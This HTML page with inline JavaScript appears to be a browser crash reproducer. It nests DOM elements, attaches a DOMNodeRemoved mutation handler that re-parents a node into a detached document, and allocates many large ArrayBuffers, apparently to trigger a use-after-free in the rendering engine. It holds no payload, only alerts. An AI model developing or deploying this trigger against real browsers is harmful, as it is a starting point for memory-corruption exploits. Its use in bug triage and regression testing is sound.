<script>
function freememory() {
 var a;
 for(var i=0;i<512;i++) {
   a = new ArrayBuffer(1024*1024);
 }
}
function go() {
  alert("before go");
  try{
  var v = document.getElementById("v");
  o.defaultValue = "x";
  a.appendChild(v);
  freememory();
  }catch(e){
  alert(e);}
  alert("after go");
}
function eventhandler2() {
  alert("eventhandler2");
 try{
  var d = document.implementation.createHTMLDocument("doc");
  var s = d.createElement("script");
  s.prepend(v);
 }catch(e){
  alert(e);
 }
 alert("end of eventhandler2");
}
function eventhandler1() {
  alert("eventhandler1");
  try{
  v.appendChild(o);
  o.addEventListener("DOMNodeRemoved", eventhandler2);
  }catch(e){
   alert(e);
  }
 alert("end of eventhandler1");
}
</script>
<body onload=go()>
</select>
<a id="a"></a>
<output id="o">foo</output>
<video id="v"></video>
<svg>
<text onload=eventhandler1() />
